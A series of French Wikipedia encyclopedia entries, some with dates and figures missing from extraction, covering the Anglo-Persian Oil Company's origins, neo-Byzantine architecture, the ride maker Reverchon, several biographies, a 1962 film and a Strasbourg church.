Une équipe de forage conduite par George B. Reynolds se mit alors à l'œuvre. Elle commença effectivement en 1902 avec le forage pétrolier à Chia Surkh dans l’ouest de l'Iran.  En 1903, le premier gisement fut découvert, et D'Arcy fonda la "First Exploration Co. Ltd. (FEC)". Cependant, il s’avéra rapidement que la source fournissait trop peu de pétrole afin de l’exploiter économiquement et obtenir un quelconque bénéfice. On déplaça la prospection pétrolière dans une région habitée des tribus Bakhtiaris. Afin d'assurer leur protection, la compagnie signa avec les chefs tribaux un contrat de concession distincte par lequel les chefs tribaux s’engageaient à fournir une participation de 3 % sur toutes les compagnies pétrolières de leur district, plus un paiement annuel de pour protéger les installations pétrolières et des pipelines à partir de 1905. 
À la fin de l’année 1905, D'Arcy avait investi dans l'exploration pétrolière sans que des quantités importantes de pétrole aient été trouvées. D'Arcy commença à négocier la vente de la concession à la ligne française des Rothschilds. Sur intervention de la British Admiralty, la Burmah Oil Company fondée en 1896 à Glasgow par Sir David Sime Cargill racheta la concession. D'Arcy vendit aussi ses à la Burmah Oil qui le remboursa en un montant non précisé en espèces.
La Birmanie (le pays est appelé en anglais "Burma" dans la période victorienne et est aujourd'hui aussi appelé le Myanmar) devint après l'invasion des troupes britanniques en 1886 une partie de l'Empire britannique. La Burmah Oil Corporation avait eu beaucoup de succès dans l'exploration et l’exploitation pétrolière. En 1899, le pétrole issu de l’exploitation était surtout vendu dans la Birmanie, bien que transporté aussi en Inde. En 1905, l'Amirauté britannique conclut avec Burmah Oil un contrat à long terme pour l'approvisionnement en pétrole de la flotte britannique.
Burmah Oil accepta de financer l'exploration pétrolière en Iran avec . Au début, la nouvelle compagnie détentrice semble rencontrer le même succès. Trois ans après la reprise de la concession de D'Arcy, on fora le un trou à de profondeur à Masjed Soleiman et on y trouva du pétrole : Burmah Oil avait découvert un des plus grands gisements de pétrole dans le monde. George B. Reynolds envoya un message codé pour avertir la direction à Londres : « Psaume 104, verset 15, 3 » (c'est-à-dire : « Et le vin qui réjouit le cœur de l'homme, qui fait reluire son visage avec l'huile, et qui soutient le cœur de l'homme avec le pain. »).
L'Anglo-Persian Oil Company.
En avril 1909, les concessionnaires fondèrent la société Anglo-Persian Oil Company (APOC) qui extrayait, traitait et vendait le pétrole découverts dans les gisements pétrolifères du sud de la Perse. La société avait un capital social d’un million de livres britanniques et était presque indépendante de la Burmah Oil Company. D'Arcy fut nommé au conseil de l'APOC et occupa ce poste jusqu'à sa mort.
En 1912, la Burmah Oil dirigée par Sir John Cargill refusa de fournir un financement supplémentaire pour l’APOC. Winston Churchill, à l'époque Premier Lord de l'Amirauté, négocia de nouveaux accords avec Burmah Oil. Avec , le gouvernement britannique acquit la majorité de l’ensemble de quatre millions de livres du capital social. En outre, un contrat à long terme pour la fourniture de la flotte britannique fut signé avec l’APOC. Grâce à cette nationalisation partielle et à l'accord d'achat de la Royal Navy, qui fut garanti par le gouvernement britannique, l'APOC était sauvé de l'effondrement financier. En 1913, la production de pétrole put ainsi reprendre. À ce moment-là, on ignorait qu’Abadan deviendrait la plus grande raffinerie du monde quelques années plus tard.
Fin de vie.
William Knox D'Arcy mourut le .
Il fut posthumement admis au Queensland Business Leaders Hall of Fame en 2012.

</doc>
<doc id="1872838" url="https://fr.wikipedia.org/wiki?curid=1872838" title="Acide trichloracétique">
Acide trichloracétique



</doc>
<doc id="1872841" url="https://fr.wikipedia.org/wiki?curid=1872841" title="L'autel">
L'autel



</doc>
<doc id="1872845" url="https://fr.wikipedia.org/wiki?curid=1872845" title="Architecture néo-byzantine">
Architecture néo-byzantine

L’architecture néo-byzantine est un style architectural qui fut employée notamment dans les édifices religieux et publics de la seconde moitié du et du début du . Émergeant dans les années 1840 en Europe de l’Ouest où elle a connu une grande vogue, elle connut son apogée dans les dernières décennies du dans l’Empire russe et, par la suite, en Bulgarie et dans l’ex-Yougoslavie de l’entre-deux guerres.
L’architecture néo-byzantine trouve ses sources dans l’architecture byzantine telle qu’elle s’est développée à Constantinople (aujourd’hui Istanbul) et dans l’exarchat de Ravenne, ainsi que, plus généralement, dans l’Empire byzantin entre les s, à laquelle s'ajoutent souvent des éléments empruntés à l’architecture chrétienne médiévale aussi bien d'Europe de l'Ouest (comme l'architecture romane pour former un style de synthèse très répandu appelé romano-byzantin), que d’Europe de l'Est, notamment orthodoxes comme l'architecture russe. Elle peut être de nature éclectique en se mélangeant avec d'autres styles : néoclassique, néo-mauresque, art déco, expressionniste, etc.
Ce style se caractérise par l’emploi de multiples arcades, de voûtes en plein-cintre et de dômes ; il recourt fréquemment aux effets polychromes de la brique et de la pierre, au stuc et, dans la décoration, à la mosaïque.
Bref historique.
Le style néo-byzantin s’est d’abord développé dans l’Empire russe et en Europe de l'Est. L'un des premiers exemples fut la cathédrale de l'Ascension de Sophia (près de Saint-Pétersbourg), qui date de 1782, l'un des plus classiques est la cathédrale Saint-Alexandre-Nevski à Sofia (Bulgarie) construite en 1882, et parmi les plus récents on compte la Cathédrale Saint-Clément d'Ohrid à Skopje en Macédoine du Nord qui date de 1990, et la cathédrale du Christ-Sauveur de Kaliningrad, inaugurée en 2006. En Russie impériale, ce style a été popularisé par l’architecte Constantin Thon, qui y mêlait des éléments néoclassiques et des éléments de l’architecture russe traditionnelle. À Belgrade, en Serbie, le style néo-byzantin s’est prolongé dans les premières décennies du , avec l’église Saint-Marc, construite de 1931 à 1940 par Petar et Branko Krstić ou encore l’église Saint-Sava commencée en 1935 sur des plans de l’architecte Aleksandar Deroko. Dans ces pays, l’architecture néo-byzantine est considérée comme vernaculaire.
De 1850 à 1880, à Bristol s’est développé un style connu sous le nom de qui fut fréquemment employé dans les bâtiments industriels et mêlait des éléments d’architecture byzantine et des éléments d’architecture mauresque.
Aux États-Unis, l’architecture néo-byzantine est présente dans plusieurs bâtiments du campus de l'université Rice au Texas inaugurée en 1912, à l'église Saint-François-de-Sales de Philadelphie et à la basilique du sanctuaire national de l'Immaculée-Conception construite entre 1920 et 1959 à Washington D.C.. Au début des années 1980, le célèbre architecte américain Philip Johnson a conçu une annexe post-moderniste au Cleveland Play House; ce bâtiment reflète des influences byzantines.
En France, la cathédrale de la Major de Marseille est caractéristique de ce style tout comme la basilique Notre-Dame-de-la-Garde, toutes deux construites par Henri Espérandieu. À Paris, la basilique du Sacré-Cœur de Montmartre (1923) s’inspire en bonne partie du style byzantin, comme de nombreuses églises bâties à la même époque (église du Saint-Esprit, église du Sacré-Cœur de Gentilly…).
Empire russe.
La cathédrale Sainte-Sophie ou de l’Ascension (1782-1788) à Tsarskoïe Selo (en russe : Софийский собор) est la première tentative de traiter des structures néo-classiques dans un style byzantin. Dans les années 1830, le tsar Nicolas (1825-1855), bien qu’il ne l’appréciât pas à titre personnel, mit à la mode le style « russo-byzantin » de Constantin Thon. De fait, son style n’aura que peu à voir avec le style byzantin. Thon remplacera le plus souvent l’arc byzantin circulaire par un gable en forme de quille et le dôme hémisphérique byzantin par un dôme à bulbe; le plan d’ensemble et la structure de ses églises appartiennent définitivement au style néo-classique.
Son successeur, Alexandre II (1855-1881) fit adopter l’art byzantin traditionnel, tel qu’illustré en peinture par Grigori Gagarine (1810-1893) et en architecture par David Grimm (1823-1898), comme style "de facto", sinon officiel, de l’Église orthodoxe russe. L’architecture byzantine devint un symbole de l’expansion de l’Église orthodoxe aux confins de l’empire (Pologne [Royaume du Congrès], Crimée, Caucase). Toutefois des difficultés financières firent en sorte que peu d’églises furent complétées. Officiellement Alexandre III (1881-1894) opta plutôt pour le style néo-russe s’inspirant des traditions de Moscou et de Iaroslavl aux et ; toutefois l’architecture byzantine demeura le premier choix, en particulier pour les grandes cathédrales. On vit surgir ces cathédrales néo-byzantines surtout dans les provinces orientales de l’empire (Pologne, Lituanie), près des bases militaires du Caucase et de l’Asie centrale ou des détachements cosaques, ainsi que dans la région industrielle de l’Oural près de Perm. Les architectes David Grimm et Vassili Kossiakov conçurent un style national typique de la cathédrale byzantine à dôme unique avec quatre absides symétriques sur pendentifs qui s’imposa comme le modèle des années 1880 et 1890. 
Sous le dernier empereur, Nicolas II (1894-1917), on assiste à un retour aux traditions issues de Sainte-Sophie, les meilleurs exemples étant ceux de la cathédrale navale de Kronstadt et la cathédrale de Ponti (Géorgie). Elles utilisaient la technique du béton armé permettant une construction beaucoup plus rapide. Si leurs intérieurs contiennent des éléments appartenant à l’Art nouveau, leur extérieur fait nettement référence à l’ancienne Constantinople. La révolution de 1917 devait mettre un terme à la tradition néo-byzantine en Russie, mais se poursuivit grâce à des architectes émigrés en Yougoslavie et à Harbin (Mandchourie) où vivaient des émigrés russes.
Autres pays à majorité orthodoxe.
Il existe dans la péninsule des Balkans de nombreuses églises néo-byzantines comme celle de Saint-Georges de Topola en Serbie, commandée en 1909 par la dynastie Karađorđević pour servir de nécropole à la famille royale serbe. L’arrivée de nombre d’artistes réfugiés de Russie après la révolution d’Octobre fit en sorte que de nombreux édifices publics gouvernementaux de Belgrade furent conçus par d’éminents architectes russes. Le roi Alexandre (r. 1921-1934) encouragea le mouvement néo-byzantin . Les principaux architectes de l’époque furent Aleksandr Deroko, Momir Korunović, Branko Kristić, Grigori Samoïlov et Nikolaï Krasnov ; leurs œuvres les plus remarquables furent le complexe royal du quartier Dedinje de Belgrade, l’église Saint-Sava de Belgrade et celle de Saint-Marc, également à Belgrade. Lorsque se termina la période communiste, Mihailo Mitrović et Nebojša Popović se firent les défenseurs de nouvelles tendances en architecture sacrée, empruntant de nombreux exemples à la tradition byzantine.
Pays germaniques.
Parmi les premiers exemples d’architecture byzantino-romane, on peut citer l’église Saint-Alexandre-Nevsky de Potsdam près de Berlin due à l’architecte russe Vassili Stassov et l’abbaye Saint-Boniface de Munich fondée en 1835 par le roi Louis de Bavière (r. 1825-1848) et complétée en 1835. Le plan architectural de l’église suit les règles de l’architecture ayant cours à Ravenne au bien que l’ordre corinthien soit en opposition avec la tradition historique byzantine. En 1876, Louis II de Bavière (r. 1845-1886) commanda des fresques néo-byzantines pour l’intérieur de son château de Neuschwanstein , y compris des mosaïques de Justinien et de saints grecs.
Dans les années 1850, l’architecte danois Theophil Hansen s’intéressa à ce style. Bien que ses œuvres majeures appartiennent aux styles néo-grec et néo-Renaissance, il devait, en tant que professeur d’art byzantin à l’Académie des Beaux-Arts de Vienne, former une génération d’architectes qui rendirent populaire l’architecture néo-byzantine en Autriche et en Hongrie, en Serbie et dans la Yougoslavie de l’après-guerre. Parmi ses propres œuvres appartenant au style néo-byzantin figurent le musée d'histoire militaire de Vienne (avec Ludwig Forster, 1852-1858), l’église grecque orthodoxe de la Sainte-Trinité de Vienne (1856-1858) et l’église du Christ de Matzleindorf, à Vienne (1858-1860).
Nombre d’églises de style néo-byzantin furent construites pendant le "Gründerzeit", période des premières années qui suivirent la formation de l'Empire allemand en 1871, comme l’église du Sacré-Cœur de Berlin-Prenzlauer Berg et la basilique du Rosaire, également située à Berlin.
Grande-Bretagne et Irlande.
On doit à John Francis Bentley (1839-1902) la cathédrale de Westminster (1895-1903) de Londres l’exemple le plus important de ce style en Grande-Bretagne. Il existe toutefois nombre d’autres églises et édifices séculiers tels que l’église du Christ de Brixton Road, également à Londres de l’architecte Arthur Beresford Pite (1897-1903), ainsi que l’église Sainte-Marie-et-Saint Georges de High Wycombe (1935-1938). Entre les années 1850 et 1880 se développa à Bristol un style connu sous le nom de « style byzantin de Bristol » combinant dans des édifices industriels des éléments de l’architecture néo-byzantine et mauresque. L’église de l’Université Newman de Dublin (1885-1886) en fournit un bon exemple pour l’Irlande.
France.
En France, le néo-byzantin a connu un vif succès dans la seconde moitié et le début du et les exemples sont nombreux. Les références à l'art byzantin s'y mélangent souvent avec le style médiéval roman du sud et de l'ouest de la France (inspiré de la cathédrale Saint-Front de Périgueux et de la cathédrale Notre-Dame du Puy-en-Velay entre autres, qui dès le Moyen Âge intégraient déjà beaucoup d'aspects de l'art byzantin) et d'Italie (roman toscan). Ce style est donc souvent qualifié de romano-byzantin. Mais sur certains édifices, les éléments byzantins peuvent aussi se mélanger avec bien d'autres styles, dans l'esprit de l’éclectisme prégnant à cette époque.
À Marseille il faut surtout citer la cathédrale de la Major et la basilique Notre-Dame-de-la-Garde qui sont caractéristiques de ce style. Elles ont toutes les deux été construites par Henri Espérandieu. A Lyon, c'est la Basilique Notre-Dame de Fourvière (1884) qui est le meilleur exemple, comme à Paris la basilique du Sacré-Cœur de Montmartre (1923) et l'église du Saint-Esprit.
Amériques.
Au Brésil, la cathédrale métropolitaine orthodoxe de São Paulo érigée à partir de 1940 sur le modèle d’Hagia Sophia et terminée en 1954 dans le cadre du 400 anniversaire de la ville est le siège de l'« archidiocèse orthodoxe antiochien de São Paulo et de tout le Brésil ».
Aux États-Unis, on retrouve des influences néo-byzantines dans nombre d’édifices dont l’architecture constitue souvent un amalgame vernaculaire de styles médiévaux romans et gothiques ou encore dans des renouveaux du « style des missions » et du « style colonial espagnol ». L’architecture néo-byzantine est présente par exemple dans plusieurs bâtiments du campus de l’université Rice au Texas, à l’église Saint-François-de-Sales de Philadelphie, à la basilique du « sanctuaire national de l’Immaculée Conception » construite entre 1920 et 1959 à Washington ou à la cathédrale basilique de Saint-Louis au Missouri. La « Christ Church United Methodist » de New York est un bon exemple de l’amalgame des styles néo-gothique et néo-byzantin.
Synagogues.
Un certain nombre de synagogues sont également construites en style néo-byzantin, les architectes se souvenant qu'à Constantinople et dans l'empire romain d'Orient, elles avaient eu pignon sur rue.

</doc>
<doc id="1872847" url="https://fr.wikipedia.org/wiki?curid=1872847" title="Le défunt par erreur">
Le défunt par erreur



</doc>
<doc id="1872848" url="https://fr.wikipedia.org/wiki?curid=1872848" title="L'humilité">
L'humilité



</doc>
<doc id="1872850" url="https://fr.wikipedia.org/wiki?curid=1872850" title="La leçon de 1980">
La leçon de 1980



</doc>
<doc id="1872853" url="https://fr.wikipedia.org/wiki?curid=1872853" title="Le veston ensorcelé">
Le veston ensorcelé



</doc>
<doc id="1872855" url="https://fr.wikipedia.org/wiki?curid=1872855" title="Hot Brain">
Hot Brain

Hot Brain est un jeu vidéo de réflexion sorti en 2007 sur PlayStation Portable. Le jeu a été développé et édité par Midway.

</doc>
<doc id="1872856" url="https://fr.wikipedia.org/wiki?curid=1872856" title="Reverchon Industries">
Reverchon Industries

Reverchon, est une entreprise familiale française, de construction d'attractions depuis 1927. L'entreprise est spécialisée dans la fabrication de montagnes russes.
Historique.
Les débuts.
En 1927, Gaston Reverchon, alors âgé de 26 ans est déjà un carrossier expérimenté. Il a déjà travaillé pour Renault, puis pour Binder. Alors que l'économie automobile montre quelques signes de faiblesse, il décide de créer des carrosseries pour des véhicules bien singuliers : des autos-tamponneuses. Ces réalisations sont alors équipées des moindres détails semblables à l'automobile (ailes, radiateur, phares et sièges confortables) ce qui constitue une grande révolution puisqu'elles n'étaient jusque-là composées quasiment que d'une planche de bois, de roues et d'un volant. Les forains apprécient la qualité des créations et lui commandent de plus en plus de pièces. À cette époque il fabrique une voiture par semaine avec l'aide de trois ouvriers et de sa femme.
En 1937, il développe un autre type de manège nommé Télécombat, un manège tournant d'avions militaires. En 1947 il innove encore avec le manège tournant Bobsleigh. Le fils aîné de Gaston, Michel, alors âgé de 17 ans, rejoint l'entreprise. Il sera suivi par son frère Christian quelques années plus tard.
Ils créent alors un site de production en 1950 à Samois-sur-Seine près de Fontainebleau, l'atelier de Gentilly étant devenu trop petit. Ils ne fabriquent pas que la carrosserie, mais l'auto entière. La Seconde Guerre mondiale stoppera la production et il faudra attendre les années 1950 et le retour au calme pour que la fabrication reprenne. Les deux fils se spécialisent, Michel en tant que designer et Christian comme technicien. La gamme des manèges présentés est alors étendue.
L'entreprise renommée « Gaston Reverchon et ses fils » prospère. Les classiques du constructeur sont améliorés et les nouvelles inventions (notamment par les fils de Gaston) sont percutantes. En 1956, ils sont les premiers à utiliser le polyester dans le domaine de la carrosserie. Le Télécombat et le Bobsleigh sont améliorés et en 1955, le premier pavillon d'auto-tamponneuses métallique est présenté.
L'Amérique.
En 1973, l'entreprise tente de conquérir l'Amérique. Christian Reverchon se rend à Chicago afin de présenter les dernières créations, Himalaya et Paratrooper. L'esthétique et le concept des attractions plaisent, seule fausse note, le temps de montage. Les attractions faites pour les forains et amenées à être déplacées, doivent pouvoir être montées et démontées rapidement, ce qui n'est pas le cas de ces modèles.
La production est plus active que jamais, près de 270 ouvriers sont alors employés et fabriquent plus de deux mille voitures et une cinquantaine de manèges par an. Malheureusement, une deuxième crise économique arrive et se fait ressentir à nouveau dans l'entreprise.
En 1974, Gaston Reverchon est nommé chevalier dans l'ordre national du Mérite pour . Il reçoit sa décoration le à la mairie de Samois-sur-Seine. La croix et le diplôme lui sont remis par Pierre Bourgeois, membre du conseil municipal, sur dérogation de l'amiral Georges Cabanier, grand chancelier de la Légion d'honneur.
En 1976, l'entreprise crée ses premières bûches pour le parc d'attractions français Bagatelle. Cette attraction va devenir un produit phare de la marque, au même titre que les autos-tamponneuses. Christian a tiré les leçons de son expérience en Amérique et présente en 1978 le premier pavillon d'autos-tamponneuses à montage hydraulique, qui permet l'installation du manège par une seule personne (au lieu de six auparavant).
En 1987, Mirapolis ouvre ses portes ainsi que l'attraction de type parcours scénique suspendu "Gargantua". Reverchon est le constructeur du système de transport de ce dernier. Le parc avait d'abord fait appel à l'entreprise Mack Rides qui n'a pas pu répondre à ses attentes.
La division de la société.
Gaston Reverchon meurt en 1982 à l'âge de 81 ans, suivi de son épouse deux semaines plus tard. Cet évènement marque un tournant majeur dans l'entreprise. Huit ans plus tard, en 1990, l'entreprise est divisée en deux firmes : Reverchon International Design et Reverchon Industrie France, dirigées respectivement par Michel (1926-2013) puis par son fils Philippe, et par Christian remplacé par son fils Gilles.
Reverchon International Design.
La société, qui a récupéré la production liée aux autos-tamponneuses a souvent été précurseur. Voici quelques-unes des améliorations qu'elle leur a apportées au fil des années :
Le , la firme fête sa auto-tamponneuse et également les 70 ans de l'entreprise. Cette année-là également, l'usine subira un grave incendie.
L'entreprise a gardé son caractère familial puisque le fils de Michel Reverchon, Philippe, accompagné de sa femme Isabelle, ont travaillé jusqu'en 2008 dans l'entreprise. On doit à Isabelle Reverchon le design des modèles Space, Cobra, Furyo, Karma, Alma, Profiler et Quad.
En , l'entreprise est placée une première fois en liquidation judiciaire. Le , l'entreprise est à nouveau en liquidation et fait faillite. Reverchon International Design a cessé toute activité.
Nota : ex-centrale d'achat de Reverchon International Design, la société Dodgem Parts for Reverchon (D.P.R.) est aujourd'hui gérée par Isabelle et Philippe Reverchon. Elle se consacre à la réalisation d'auto-tamponneuses et de pièces détachées. En 2011, un nouveau modèle d'auto voit le jour, la I-Car. L'entreprise est située à Saint-Agnan, en Bourgogne.
Reverchon Industries France.
En 1996, le premier circuit de montagnes russes a été présenté par la firme. Il s'agissait de montagnes russes tournoyantes. L'attraction fut un réel succès et on compte aujourd'hui plus de 80 attractions de ce type dans le monde. En 2000, sort le Gliding Coaster (montagnes russes suspendues).
L'année 2002 a été difficile pour toutes les entreprises travaillant dans le monde du loisirs et Reverchon comme beaucoup d'autres constructeurs sur le plan international a subi les répercussions du 11 septembre 2001. En effet, Disney et beaucoup d'autres parcs aux États-Unis ont du fermer plusieurs jours à la suite de ces attentats. Néanmoins l'entreprise a su se renouveler et continuer à développer le marché européen.
La société Reverchon Industrie France est devenue aujourd'hui Reverchon. Sa filiale SAMC-Avia continue cependant à fabriquer des manèges sous la marque Reverchon jusqu'à aujourd'hui.
Flume Ride, Gliding Coaster, Himalaya, Spinning Raft, Spinning Coaster et Compact Spinning Coaster, Steel Coaster, Télécombat.

</doc>
<doc id="1872857" url="https://fr.wikipedia.org/wiki?curid=1872857" title="Joseph C. Wilson">
Joseph C. Wilson

Joseph Charles Wilson IV, né le à Bridgeport dans le Connecticut et mort le à Santa Fe au Nouveau-Mexique, est un diplomate et écrivain américain, qui a été chargé d'affaires à l'ambassade des États-Unis en Irak à Bagdad lors de l'invasion du Koweït par les troupes irakiennes de Saddam Hussein.
Biographie.
Il a été ambassadeur des États-Unis au Gabon et à Sao Tomé-et-Principe de 1992 à 1995.
Avec son épouse Valerie Plame, il a été impliqué dans l'affaire Plame-Wilson concernant la suspicion sur la présence d'armes de destruction massive en Irak. 
Après avoir divorcé en 2017, il meurt en 2019 d'une insuffisance d'organe.

</doc>
<doc id="1872858" url="https://fr.wikipedia.org/wiki?curid=1872858" title="Toby Stephens">
Toby Stephens

Toby Stephens, né le à Londres, Angleterre, est un acteur britannique.
Dans les années 1990, il obtient assez vite une reconnaissance critique au sein de la Royal Shakespeare Company et remporte plusieurs récompenses de théâtre. En 2002, il joue le méchant du film de James Bond, "Meurs un autre jour". Malgré cette nouvelle notoriété, il apparait peu au cinéma et joue plutôt au théâtre ou dans des séries britanniques telles que "Napoléon" en 2002 et "Jane Eyre" en 2006. De 2014 à 2017, il tient le rôle principal de la série américaine "Black Sails".
Biographie.
Toby Stephens est le fils de deux grands acteurs britanniques : Maggie Smith et Robert Stephens. Il a un frère, l'acteur Chris Larkin.
À cause des problèmes d'alcoolisme de Robert Stephens, Maggie Smith divorce alors qu'il est âgé de . Les deux enfants vivent avec leur mère, entre Canada, États-Unis et Royaume-Uni, au fil de ses projets artistiques.
Elle se remarie avec le dramaturge Beverley Cross, qui devient un père pour les deux garçons.
Il étudie à l'école Aldro de Shackleford, dans le comté de Surrey puis au d', dans le Sussex de l'Ouest. Il rejoint ensuite la London Academy of Music and Dramatic Art (LAMDA).
Vie privée.
Il reconnait avoir un problème d'alcoolisme dans les années 1990, comme son père qui en est mort en 1995. Son addiction commençait à avoir des conséquences sur son travail au théâtre : il s'est endormi, saoul, avant une représentation de "Britannicus" face à l'actrice Diana Rigg. Il a donc décidé de ne plus boire une seule goutte d'alcool.
En 2001, il se marie avec l'actrice néo-zélandaise Anna-Louise Plowman, une ancienne camarade de classe perdue de vue qu'il a revue lors d'une audition pour un doublage. Ils ont trois enfants : Eli (né en 2007), Tallulah (née en 2009) et Kura (née en 2010).
Carrière.
Toby Stephens fait ses débuts au cinéma en 1992 dans le film "Orlando" de Sally Potter dans le rôle d'Othello. La même année, il apparait dans la mini-série "The Camomile Lawn".
Mais il commence sa carrière au théâtre, notamment au sein de la Royal Shakespeare Company.
En 1994, alors qu'il n'est âgé que de , il joue le rôle-titre de "Coriolan" de William Shakespeare. Il obtient une reconnaissance critique et se voit récompensé du Ian Charleson Award et du . Il joue dans "Unfinished Business" et "Mesure pour mesure" sous la direction de Stephen Pimlott, dans "Le Songe d'une nuit d'été" dans une mise en scène d'Adrian Noble, dans "Antoine et Cléopâtre" pour , dans "Un tramway nommé Désir", "Tartuffe" et "Tout est bien qui finit bien" sous la direction de Peter Hall.
En 1996, il fait son retour au cinéma dans "La Nuit des rois" de Trevor Nunn. Il joue dans plusieurs films tels que "Forever" de Nick Willing en 1997, "Onegin" de Martha Fiennes en 1999, "Space Cowboys" de Clint Eastwood en 2000 et "Possession" de Neil LaBute en 2001. Il apparait également à la télévision, dans les mini-séries "The Tenant of Wildfell Hall" en 1996 et ' en 2001, et dans le téléfilm ' de Robert Markowitz en 2000.
En 2002, il joue le rôle de Gustav Graves, le méchant du de James Bond, "Meurs un autre jour" de Lee Tamahori, face à Pierce Brosnan en agent 007. À , il est alors le plus jeune acteur à jouer un méchant de la saga. Plus tard, il dira à propos du film et de son personnage (un nord-coréen génétiquement modifié), que c'était . Malgré sa nouvelle notoriété, il disparait du grand écran, ne se voyant offrir que des rôles de .
Il se met alors à apparaitre plus souvent à la télévision, comme dans les mini-séries "Napoléon" en 2002, "Cambridge Spies" en 2003, et ' en 2004. Il joue également dans des épisodes des séries "Hercule Poirot" en 2003 et "Meurtres en sommeil" en 2005, et refait son apparition au cinéma dans ' de Ketan Mehta en 2005 et dans "" de Ray Gower et "Severance" de Christopher Smith en 2006.
En 2006, il joue l'un des rôles principaux de la mini-série "Jane Eyre" de la BBC. Il obtient des critiques enthousiastes et se voit nommé au Satellite Award du meilleur acteur dans une mini-série ou un téléfilm l'année suivante.
Il continue à jouer dans des séries : "Robin des Bois" en 2009, "Vexed" de 2010 à 2012, "Strike Back" et "Miss Marple" en 2010, "Londres, police judiciaire" en 2011, "Inspecteur Lewis" en 2012.
À partir de 2014, jusqu'en 2017, il joue le rôle du Capitaine Flint, personnage principal de la série américaine de piraterie "Black Sails", inspirée du roman "L'Île au trésor" de Robert Louis Stevenson.
En 2015, il joue dans la mini-série "And Then There Were None", adaptée du roman "Dix petits nègres" d'Agatha Christie.
En 2018, il joue dans la série télévisée "Perdus dans l'espace".
Voix francophones.
En France, Pierre-François Pistorio est la voix la plus régulière de Toby Stephens, le doublant à trois reprises. Éric Herson-Macarel et Rémi Bichet l'ont également doublé à deux occasions.

</doc>
<doc id="1872859" url="https://fr.wikipedia.org/wiki?curid=1872859" title="Liste des grandes inventions">
Liste des grandes inventions



</doc>
<doc id="1872864" url="https://fr.wikipedia.org/wiki?curid=1872864" title="Alain Darbel">
Alain Darbel

Alain Darbel ( à Argenteuil - à Chamonix) est un sociologue français et un ancien administrateur de l'Insee. Il s’est intéressé principalement à la sociologie de l’administration. Son nom reste associé à celui de Pierre Bourdieu, avec qui il a publié une étude sur l’art et la fonction des musées, intitulée "L'Amour de l'art". Alain Darbel, en sa qualité de statisticien, fut en particulier chargé de la construction du plan de sondage et de l'élaboration du modèle mathématique qui sous-tend cet ouvrage.
Un parcours entre sociologie et statistiques.
La période algérienne.
À sa sortie de l'école d'application de l'Insee et après avoir effectué son service militaire en Algérie, il est nommé à la Statistique de l'Algérie. Il y rencontre Pierre Bourdieu qui rédige des articles pour la revue du service d'information des armées et réunit des matériaux statistiques pour son ouvrage "La sociologie de l'Algérie". Malgré la guerre, la Statistique d'Algérie s'est lancée, dans le contexte du plan Constantine, dans une vaste série d'enquêtes statistiques. L'un de ses volets — l'Enquête emploi et statistique — sera publiée en 1963 sous le titre "Travail et travailleurs en Algérie". Darbel fait partie avec Claude Seibel des concepteurs de cette enquête. Pour surmonter les difficultés liées à l'utilisation des outils d'enquête et des catégories importées de la métropole, ils travaillent avec Pierre Bourdieu à la mise en place d'un nouveau protocole d'enquête associant statistiques et investigation sociologique et ethnologique (entretiens semi-directifs).
Alain Darbel sera aussi chargé des apports statistiques de l'enquête réalisée par Abdelmalek Sayad et Pierre Bourdieu à propos des « centres de regroupement » qui deviendra "Le déracinement" (Minuit).
Le retour à Paris.
Alain Darbel revient à Paris en 1962. Il obtient la possibilité de travailler à mi-temps au Centre de sociologie européenne. En , il participe à l'organisation d'un colloque du cercle de Noroît d'Arras. Il s'agit d'un débat entre sociologues, économistes et statisticiens principalement issus des rangs de l'Insee sur les transformations de la société française d'après guerre. L'ouvrage "Le partage des bénéfices" en reprend les conclusions.
De 1969 à 1972, il occupe le poste de chef du département méthodes et sondages dans le service des études statistiques de l'Éducation nationale. La problématique ne lui est pas inconnue puisqu'il avait déjà participé à la constitution du plan de sondage à la base des "Héritiers" de Passeron et Bourdieu. Il tente de mettre en place de nouveaux indicateurs qui pourraient rendre compte des différences de trajectoires scolaires selon l'origine sociale des élèves. Une telle démarche implique une remise en cause profonde des objectifs et des méthodes qui caractérisent traditionnellement les services administratifs centraux, plus attachés à une appréhension quantitative des phénomènes qu'à une évaluation qualitative (il introduit ainsi de nouvelles variables qui permettent de mieux saisir l'environnement des élèves).
Il revient de l'Éducation Nationale vers l'Insee en 1972. Il participe à l'instauration au sein de cette institution de comptes économiques par fonction (santé, éducation, recherche, logement…) au cours des années 1970 et 1980 et au lancement de "Données sociales" en 1973 dont il devient le rédacteur en chef. Il disparaît prématurément en 1975.

</doc>
<doc id="1872865" url="https://fr.wikipedia.org/wiki?curid=1872865" title="Chasseur d'appartement">
Chasseur d'appartement



</doc>
<doc id="1872866" url="https://fr.wikipedia.org/wiki?curid=1872866" title="L'Épée enchantée">
L'Épée enchantée

L'Épée enchantée ("The Magic Sword") est un film américain réalisé par Bert I. Gordon, sorti en 1962.
Synopsis.
Georges (Gary Lockwood) est le fils de la sorcière Sybile (Estelle Winwood). Elle le garde chez elle, sous sa protection magique, jusqu'au jour où Georges qui approche de son (majorité) fait la connaissance de la belle princesse Helene (Anne Helm). La princesse se fait enlever par le diabolique sorcier Lodac. Avec l'aide d'une armure magique et six chevaliers sortis d'un sortilège, Georges part à la recherche de la princesse pour la sauver des griffes de Lodac, mais sept épreuves maléfiques attendent nos valeureux chevaliers. Sir Georges réussira-t-il malgré les nombreux pièges mis sur sa route ?

</doc>
<doc id="1872870" url="https://fr.wikipedia.org/wiki?curid=1872870" title="L'épée enchantée">
L'épée enchantée



</doc>
<doc id="1872878" url="https://fr.wikipedia.org/wiki?curid=1872878" title="Église Sainte-Aurélie de Strasbourg">
Église Sainte-Aurélie de Strasbourg

L’église Sainte-Aurélie de Strasbourg est située rue Martin-Bucer dans le quartier de la Gare. C'est une église protestante luthérienne de la confession d'Augsbourg. Selon l'historiographie médiévale, il s'agirait de l'un des plus anciens sanctuaires de la ville. En 1524 Martin Bucer fit ses débuts comme prédicateur dans cette église acquise à la Réforme l'année précédente. Même s'il y subsiste quelques éléments d'architecture romane et gothique, Sainte-Aurélie est surtout remarquée pour son agencement intérieur baroque blanc et or – autel et chaire du , orgue conçu par André Silbermann en 1713 – et la nef imposante de la nouvelle église, entièrement reconstruite au . Ces atouts ont valu à l'église Sainte-Aurélie d'être classée par les Monuments historiques le . Entre 2002 et 2015, l'église et l'orgue Silbermann ont fait l'objet d'importants travaux de restauration.
Situation.
L'église Sainte-Aurélie se trouve au cœur d'un faubourg populaire désigné sous le nom de Faubourg National depuis la Révolution française, mais connu auparavant comme le Faubourg des Charrons, puis le Faubourg Blanc. C'était autrefois un quartier de maraîchers, de jardiniers et de couvents.
